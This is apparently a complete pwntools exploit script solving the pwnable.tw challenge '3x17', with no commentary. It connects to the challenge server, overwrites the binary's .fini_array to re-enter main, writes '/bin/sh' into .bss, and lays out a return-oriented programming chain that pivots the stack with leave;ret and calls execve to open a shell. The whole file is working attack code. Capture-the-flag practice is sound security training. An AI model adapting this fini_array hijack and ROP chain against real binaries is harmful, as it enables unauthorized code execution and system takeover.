#!python3
from pwn import *

main_addr=	0x401b6d
fini_addr=	0x402960
fini_array=	0x4b40f0
bss_addr=	0x4b92e0

locdbg=		False

pop_rax_ret=	0x41e4af
pop_rdi_ret=	0x401696
pop_rsi_ret=	0x406c30
pop_rdx_ret=	0x446e35
syscall_addr=	0x4022b4
leave_ret=		0x401c4b

elf=ELF('3x17')

if locdbg:
	p=process('3x17')
else:
	p=remote('chall.pwnable.tw',10105)

def wb(addr,data):
	p.recv()
	p.send(str(addr))
	p.recv()
	p.send(data)

def setrop(base,chain):
	offset=16
	for i in range(1,len(chain)):
		wb(base+offset,chain[i])
		offset+=16
	wb(base,p64(leave_ret)+rc[0])
		

def dbg():
	if locdbg:
		gdb.attach(p)
	
wb(fini_array,p64(fini_addr)+p64(main_addr))
wb(bss_addr,'/bin/sh\0')
rc=[]
rc.append(p64(pop_rdi_ret))
rc.append(p64(bss_addr)+p64(pop_rsi_ret))
rc.append(p64(0)+p64(pop_rdx_ret))
rc.append(p64(0)+p64(pop_rax_ret))
rc.append(p64(59)+p64(syscall_addr))

setrop(fini_array,rc)

p.interactive()

